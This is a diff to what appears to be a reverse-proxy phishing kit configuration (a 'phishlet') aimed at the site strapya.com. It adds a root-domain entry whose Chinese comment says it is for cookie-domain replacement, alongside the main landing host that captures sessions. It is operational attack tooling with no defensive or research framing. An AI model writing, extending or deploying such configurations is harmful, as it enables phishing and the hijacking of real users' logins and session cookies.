@@ -1,5 +1,7 @@
 min_ver: '3.0.0'
 proxy_hosts:
+  # 根域名（用于 cookie domain 替换）
+  - {phish_sub: '', orig_sub: '', domain: 'strapya.com', session: false, is_landing: false, auto_filter: true}
   # 主域名
   - {phish_sub: 'www', orig_sub: 'www', domain: 'strapya.com', session: true, is_landing: true, auto_filter: true }
   # 静态页面
